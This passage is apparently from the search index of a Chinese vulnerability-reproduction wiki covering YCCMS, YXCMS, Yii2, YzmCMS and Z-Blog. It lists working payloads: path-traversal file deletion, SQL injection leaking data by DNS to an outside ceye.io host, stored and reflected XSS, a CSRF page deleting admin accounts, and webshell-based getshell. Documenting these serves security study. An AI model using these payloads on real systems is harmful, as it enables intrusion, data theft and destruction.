pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t \u53ea\u9700\u8981\u66f4\u6539pid[0]\u5373\u53ef\u5728\u65e0\u767b\u5f55\u6761\u4ef6\u4e0b\u4efb\u610f\u5220\u9664\u6587\u4ef6\uff0c\u5220\u9664\u6839\u76ee\u5f55\u4e0b\u76841.txt \u5df2\u7ecf\u5220\u9664\u6210\u529f\u4e86 \u5176\u5b9e\u8fd9\u8fd8\u662f\u72af\u4e86\u4e00\u4e2a\u6700\u5bb9\u6613\u72af\u7684\u9519\u8bef\uff0c\u6ca1\u6709\u5bf9\u4f20\u8fdb\u6765\u7684\u8def\u5f84\u8fdb\u884c\u8fc7\u6ee4\u5c31\u62fc\u63a5\u4e86\u76ee\u5f55\uff0c\u5bfc\u81f4\u4e86\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\u7684\u4ea7\u751f \u6839\u636eurl\u5b9a\u4f4d\u5230\u76f8\u5173\u51fd\u6570\u4f4d\u7f6e,\u4f4d\u4e8e/controller/PicAction.class.php public function delall(){ if(isset($_POST['send'])){ if(validate::isNullString($_POST['pid'])) tool::layer_alert('\u6ca1\u6709\u9009\u62e9\u4efb\u4f55\u56fe\u7247!','?a=pic',7); $_fileDir=ROOT_PATH.'/uploads/'; foreach($_POST['pid'] as $_value){ $_filePath=$_fileDir.$_value; if(!unlink($_filePath)){ tool::layer_alert('\u56fe\u7247\u5220\u9664\u5931\u8d25,\u8bf7\u8bbe\u6743\u9650\u4e3a777!','?a=pic',7); }else{ header('Location:?a=pic'); } } } } \u5bf9 pid\u4f20\u8fdb\u6765\u7684\u503c\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\u5c31\u8fdb\u884c\u4e86\u4e86\u8def\u5f84\u7684\u62fc\u63a5\uff0c\u5bfc\u81f4\u4e86\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u89e6\u53d1\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e","title":"\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YCCMS3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#_4","text":"https://xz.aliyun.com/t/7748#toc-4","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/","text":"1. \u5f71\u54cd\u7248\u672c \u00b6 1.4.7 2.\u6f0f\u6d1e\u590d\u73b0 \u00b6 url:/index.php?r=admin/fragment/index \u5229\u7528ceye\u5f97\u5230\u7684\u56de\u663e \u7528bp\u6293\u5305\uff0c\u4fee\u6539id\u4e3a payload: 2 and if((select load_file(concat('\\\\',(select database()),'.36rdia.ceye.io\\abc'))),2,2) \u5728ceye\u4e0a\u9762\u53ef\u4ee5\u5f97\u5230\u56de\u663e\uff1a \u5f97\u5230\u4e86\u6570\u636e\u5e93\u540d\u79f0yxcms","title":"YXCMS 1.4.7SQL\u6ce8\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/#1","text":"1.4.7","title":"1. \u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7SQL%E6%B3%A8%E5%85%A5/#2","text":"url:/index.php?r=admin/fragment/index \u5229\u7528ceye\u5f97\u5230\u7684\u56de\u663e \u7528bp\u6293\u5305\uff0c\u4fee\u6539id\u4e3a payload: 2 and if((select load_file(concat('\\\\',(select database()),'.36rdia.ceye.io\\abc'))),2,2) \u5728ceye\u4e0a\u9762\u53ef\u4ee5\u5f97\u5230\u56de\u663e\uff1a \u5f97\u5230\u4e86\u6570\u636e\u5e93\u540d\u79f0yxcms","title":"2.\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/","text":"1.\u5f71\u54cd\u7248\u672c \u00b6 YXcms 1.4.7 2.\u590d\u73b0\u8fc7\u7a0b \u00b6 \u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002 /index.php?r=admin/set/tpadd&Mname=default \u65b0\u5efa\u6a21\u677f\u6587\u4ef6\uff1a \u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u7684\u6587\u4ef6\u3002\u3002 \u901a\u8fc7\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u627e\u5230\u65b0\u7684\u6a21\u677f\u6587\u4ef6\u7684\u4f4d\u7f6e\uff1a /protected/apps/default/view/default/phpinfo.php \u53ef\u4ee5\u770b\u5230\u662f\u6211\u4eec\u5199\u5165\u7684\u6587\u4ef6\u88ab\u6267\u884c\u4e86\uff0c\u6240\u6709\u53ef\u4ee5\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u6765\u8fdb\u884cgetshell\u3002\u3002","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5199\u5165"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#1","text":"YXcms 1.4.7","title":"1.\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/#2","text":"\u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002 /index.php?r=admin/set/tpadd&Mname=default \u65b0\u5efa\u6a21\u677f\u6587\u4ef6\uff1a \u53ef\u4ee5\u521b\u5efa\u4efb\u610f\u7684\u6587\u4ef6\u3002\u3002 \u901a\u8fc7\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u627e\u5230\u65b0\u7684\u6a21\u677f\u6587\u4ef6\u7684\u4f4d\u7f6e\uff1a /protected/apps/default/view/default/phpinfo.php \u53ef\u4ee5\u770b\u5230\u662f\u6211\u4eec\u5199\u5165\u7684\u6587\u4ef6\u88ab\u6267\u884c\u4e86\uff0c\u6240\u6709\u53ef\u4ee5\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u6765\u8fdb\u884cgetshell\u3002\u3002","title":"2.\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/","text":"1.\u5f71\u54cd\u7248\u672c \u00b6 YXcms 1.4.7 2. \u590d\u73b0\u8fc7\u7a0b \u00b6 \u8fd9\u4e2a\u6f0f\u6d1e\u662f\u5728\u540e\u53f0 \u770b\u5230\u4e86\u8fd9\u91cc\u6709\u4e00\u4e2a\u5220\u9664\u7684\u6309\u94ae \u70b9\u51fb\u5220\u9664\uff0c\u8fdb\u884c\u6293\u5305\uff1a \u901a\u8fc7\u63a7\u5236fname\u53c2\u6570\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u529f\u80fd \u4ee3\u7801\u5206\u6790 \u4ee3\u7801\u4f4d\u7f6eprotected/apps/admin/controller/filesController.php\uff1a public function del() { $dirs=in($_GET['fname']); $dirs=str_replace(',','/',$dirs); $dirs=ROOT_PATH.'upload'.$dirs; if(is_dir($dirs)){del_dir($dirs); echo 1;} elseif(file_exists($dirs)){ if(unlink($dirs)) echo 1; }else echo '\u6587\u4ef6\u4e0d\u5b58\u5728'; } \u5bf9fname\u8fdb\u884c\u66ff\u6362\u64cd\u4f5cstr_replace(',','/',$dirs); \u8bb2\u53c2\u6570\u6700\u524d\u9762\u7684\u5206\u53f7(%2C)\u66ff\u6362\u4e3a/ \u7136\u540e\u5b8c\u6574\u7684\u62fc\u63a5\u8def\u5f84\uff0c\u770b\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5b58\u5728\u5c31\u8fdb\u884c\u5220\u9664 \u8fd9\u91cc\u6ca1\u6709\u8bfb\u4f20\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c \u53ef\u4ee5\u53ca\u9006\u884c\u4e0a\u8df3\u76ee\u5f55\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u6548\u679c","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff08\u4e00\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/#1","text":"YXcms 1.4.7","title":"1.\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%B8%80%EF%BC%89/#2","text":"\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u5728\u540e\u53f0 \u770b\u5230\u4e86\u8fd9\u91cc\u6709\u4e00\u4e2a\u5220\u9664\u7684\u6309\u94ae \u70b9\u51fb\u5220\u9664\uff0c\u8fdb\u884c\u6293\u5305\uff1a \u901a\u8fc7\u63a7\u5236fname\u53c2\u6570\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u529f\u80fd \u4ee3\u7801\u5206\u6790 \u4ee3\u7801\u4f4d\u7f6eprotected/apps/admin/controller/filesController.php\uff1a public function del() { $dirs=in($_GET['fname']); $dirs=str_replace(',','/',$dirs); $dirs=ROOT_PATH.'upload'.$dirs; if(is_dir($dirs)){del_dir($dirs); echo 1;} elseif(file_exists($dirs)){ if(unlink($dirs)) echo 1; }else echo '\u6587\u4ef6\u4e0d\u5b58\u5728'; } \u5bf9fname\u8fdb\u884c\u66ff\u6362\u64cd\u4f5cstr_replace(',','/',$dirs); \u8bb2\u53c2\u6570\u6700\u524d\u9762\u7684\u5206\u53f7(%2C)\u66ff\u6362\u4e3a/ \u7136\u540e\u5b8c\u6574\u7684\u62fc\u63a5\u8def\u5f84\uff0c\u770b\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5b58\u5728\u5c31\u8fdb\u884c\u5220\u9664 \u8fd9\u91cc\u6ca1\u6709\u8bfb\u4f20\u5165\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c \u53ef\u4ee5\u53ca\u9006\u884c\u4e0a\u8df3\u76ee\u5f55\uff0c\u4ece\u800c\u8fbe\u5230\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u6548\u679c","title":"2. \u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/","text":"1.\u5f71\u54cd\u7248\u672c \u00b6 1.4.7 2.\u590d\u73b0\u8fc7\u7a0b \u00b6 \u6f0f\u6d1e\u4f4d\u7f6e\u8fd8\u5728\u540e\u53f0\uff1a \u5728\u5bf9\u6587\u7ae0\u7f16\u8f91\u7684\u9875\u9762\u4e0a\uff0c\u53d1\u73b0\u5b58\u5728\u5220\u9664\u5df2\u4e0a\u4f20\u7684\u56fe\u7247\u7684\u529f\u80fd \u8bbe\u7f6e\u6293\u5305\uff0c\u70b9\u51fb\u5220\u9664\uff1a \u867d\u7136\u663e\u793a\u7684\u662f\u7f29\u7565\u56fe\u4e0d\u5b58\u5728\uff0c\u4f46\u662f\u901a\u8fc7\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u5220\u9664\u4e86123.txt\u8fd9\u4e2a\u6587\u4ef6 \u4e5f\u662f\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664","title":"YXCMS 1.4.7\u4efb\u610f\u6587\u4ef6\u5220\u9664\uff08\u4e8c\uff09"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/#1","text":"1.4.7","title":"1.\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%EF%BC%88%E4%BA%8C%EF%BC%89/#2","text":"\u6f0f\u6d1e\u4f4d\u7f6e\u8fd8\u5728\u540e\u53f0\uff1a \u5728\u5bf9\u6587\u7ae0\u7f16\u8f91\u7684\u9875\u9762\u4e0a\uff0c\u53d1\u73b0\u5b58\u5728\u5220\u9664\u5df2\u4e0a\u4f20\u7684\u56fe\u7247\u7684\u529f\u80fd \u8bbe\u7f6e\u6293\u5305\uff0c\u70b9\u51fb\u5220\u9664\uff1a \u867d\u7136\u663e\u793a\u7684\u662f\u7f29\u7565\u56fe\u4e0d\u5b58\u5728\uff0c\u4f46\u662f\u901a\u8fc7\u67e5\u770b\u53d1\u73b0\u5df2\u7ecf\u5220\u9664\u4e86123.txt\u8fd9\u4e2a\u6587\u4ef6 \u4e5f\u662f\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664","title":"2.\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/","text":"1.\u5f71\u54cd\u7248\u672c \u00b6 YXcms 1.4.7 2.\u590d\u73b0\u8fc7\u7a0b \u00b6 \u524d\u53f0\u6709\u7559\u8a00\u677f\u7684\u529f\u80fd\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff1a payload\uff1a <svg/onload=alert(1)> \u5f53\u7ba1\u7406\u5458\u5728\u540e\u53f0\u67e5\u770b\u7559\u8a00\u7684\u65f6\u5019\uff0c\u5c31\u80fd\u89e6\u53d1 xss\uff1a \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2axss\u6765\u83b7\u53d6\u7ba1\u7406\u5458\u7684cookie\uff0c\u4ece\u800c\u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002\u3002","title":"YXCMS 1.4.7\u50a8\u5b58\u578bxss"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#1","text":"YXcms 1.4.7","title":"1.\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXCMS%201.4.7%E5%82%A8%E5%AD%98%E5%9E%8Bxss/#2","text":"\u524d\u53f0\u6709\u7559\u8a00\u677f\u7684\u529f\u80fd\uff0c\u8fdb\u884c\u6d4b\u8bd5\uff1a payload\uff1a <svg/onload=alert(1)> \u5f53\u7ba1\u7406\u5458\u5728\u540e\u53f0\u67e5\u770b\u7559\u8a00\u7684\u65f6\u5019\uff0c\u5c31\u80fd\u89e6\u53d1 xss\uff1a \u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2axss\u6765\u83b7\u53d6\u7ba1\u7406\u5458\u7684cookie\uff0c\u4ece\u800c\u8fdb\u5165\u7f51\u7ad9\u540e\u53f0\u3002\u3002","title":"2.\u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","text":"1.\u6f0f\u6d1e\u7b80\u4ecb \u00b6 YXcms 1.4.7\u7248\u672c\u4e2d\u7684protected/apps/admin/controller/adminController.php\u6587\u4ef6\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9index.php?r=admin/admin/admindel\u5229\u7528\u8be5\u6f0f\u6d1e\u5220\u9664\u7ba1\u7406\u5458\u8d26\u6237\u3002 2.\u5f71\u54cd\u7248\u672c \u00b6 YXcms 1.4.7 3. \u590d\u73b0\u8fc7\u7a0b \u00b6 \u7ba1\u7406\u5458\u70b9\u51fb\u94fe\u63a5 http://192.168.232.133/evil.html evil.html <html> <a href=\"http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&id=1\">test</a> </html>","title":"YXcms 1.4.7 \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#1","text":"YXcms 1.4.7\u7248\u672c\u4e2d\u7684protected/apps/admin/controller/adminController.php\u6587\u4ef6\u5b58\u5728\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9index.php?r=admin/admin/admindel\u5229\u7528\u8be5\u6f0f\u6d1e\u5220\u9664\u7ba1\u7406\u5458\u8d26\u6237\u3002","title":"1.\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#2","text":"YXcms 1.4.7","title":"2.\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YXCMS/YXcms%201.4.7%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#3","text":"\u7ba1\u7406\u5458\u70b9\u51fb\u94fe\u63a5 http://192.168.232.133/evil.html evil.html <html> <a href=\"http://127.0.0.1/yxcms1.4.7/index.php?r=admin/admin/admindel&id=1\">test</a> </html>","title":"3. \u590d\u73b0\u8fc7\u7a0b"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","text":"\u7b80\u4ecb \u00b6 \u5982\u679c\u5728\u4f7f\u7528yii\u6846\u67b6\uff0c\u5e76\u4e14\u5728\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u5904\u8c03\u7528\u4e86unserialize()\u5e76\u5141\u8bb8\u7279\u6b8a\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u3002 \u8be5\u6f0f\u6d1e\u53ea\u662fphp \u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u94fe\uff0c\u5fc5\u987b\u8981\u914d\u5408unserialize\u51fd\u6570\u624d\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u8be5\u53cd\u5e8f\u5217\u5316\u6267\u884c\u94fe\u5728\u4eca\u5e748\u6708\u521d\u5df2\u7ecf\u516c\u5f00\uff0c\u5efa\u8bae\u4f7f\u7528yii\u6846\u67b6\u7684\u540c\u5b66\u6392\u67e5 \u5f71\u54cd\u8303\u56f4 \u00b6 Yii2 <2.0.38 \u4fee\u590d\u65b9\u6848 \u00b6 \u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u7981\u6b62BatchQueryResult\u7c7b\u88ab\u53cd\u5e8f\u5217\u5316 exp \u00b6 exp.txt CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316RCE\u5229\u7528\u94fe \u53c2\u8003\u94fe\u63a5 \u00b6 https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99 https://xz.aliyun.com/t/8082#toc-8 https://github.com/AFKL-CUIT/phpggc/","title":"CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"\u5982\u679c\u5728\u4f7f\u7528yii\u6846\u67b6\uff0c\u5e76\u4e14\u5728\u7528\u6237\u53ef\u4ee5\u63a7\u5236\u7684\u8f93\u5165\u5904\u8c03\u7528\u4e86unserialize()\u5e76\u5141\u8bb8\u7279\u6b8a\u5b57\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u53d7\u5230\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u653b\u51fb\u3002 \u8be5\u6f0f\u6d1e\u53ea\u662fphp \u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u94fe\uff0c\u5fc5\u987b\u8981\u914d\u5408unserialize\u51fd\u6570\u624d\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u4ee3\u7801\u6267\u884c\u7684\u5371\u5bb3\u3002 \u8be5\u53cd\u5e8f\u5217\u5316\u6267\u884c\u94fe\u5728\u4eca\u5e748\u6708\u521d\u5df2\u7ecf\u516c\u5f00\uff0c\u5efa\u8bae\u4f7f\u7528yii\u6846\u67b6\u7684\u540c\u5b66\u6392\u67e5","title":"\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"Yii2 <2.0.38","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"\u76ee\u524d\u5b98\u65b9\u5df2\u7ecf\u7981\u6b62BatchQueryResult\u7c7b\u88ab\u53cd\u5e8f\u5217\u5316","title":"\u4fee\u590d\u65b9\u6848"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#exp","text":"exp.txt CVE-2020-15148 Yii\u6846\u67b6\u53cd\u5e8f\u5217\u5316RCE\u5229\u7528\u94fe","title":"exp"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Yii/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_4","text":"https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99 https://xz.aliyun.com/t/8082#toc-8 https://github.com/AFKL-CUIT/phpggc/","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 YzmCMS 3.6\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw ( zzw@5ecurity.cn ) http://www.yzmcms.com/ http://www.yzmcms.com/ 3.6 CVE-2018-7653 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 YzmCMS 3.6\u7248\u672c\u7684 index.php\u9875\u9762a\u3001c\u3001m\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 poc\u4ee3\u7801: http://localhost/YzmCMS/index.php?m=search & c=index & a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=search & c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck & a=init & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf & c=index & a=init & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=search & c=index & a=init & modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0 & q=tes","title":"YzmCMS 3.6\u5b58\u5728XSS\u6f0f\u6d1e"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 YzmCMS 3.6\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw ( zzw@5ecurity.cn ) http://www.yzmcms.com/ http://www.yzmcms.com/ 3.6 CVE-2018-7653","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","text":"YzmCMS 3.6\u7248\u672c\u7684 index.php\u9875\u9762a\u3001c\u3001m\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/YzmCMS/YzmCMS%203.6%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","text":"poc\u4ee3\u7801: http://localhost/YzmCMS/index.php?m=search & c=index & a=initxqb4n%3Cimg%20src%3da%20onerror%3dalert(1)%3Ecu9rs & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=search & c=indexf9q6s%3cimg%20src%3da%20onerror%3dalert(1)%3ej4yck & a=init & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=searchr81z4%3cimg%20src%3da%20onerror%3dalert(1)%3eo92wf & c=index & a=init & modelid=1 & q=tes http://localhost/YzmCMS/index.php?m=search & c=index & a=init & modelid=1b2sgd%22%3e%3cscript%3ealert(1)%3c%2fscript%3eopzx0 & q=tes","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Z-Blog/Z-Blog%201.5.1.1740%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Z-Blog 1.5.1.1740\u5b58\u5728XSS\u6f0f\u6d1e 2018-04-05 zzw ( zzw@5ecurity.cn ) https://www.zblogcn.com/ https://github.com/zblogcn/zblogphp 1.5.1.1740 CVE-2018-7736 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 Z-BlogPHP 1.5.1.1740\u7248\u672c\u7684cmd.php\u9875\u9762ZC_BLOG_SUBNAME\u53caZC_UPLOAD_FILETYPE\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\u53ef\u5bfc\u81f4\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a 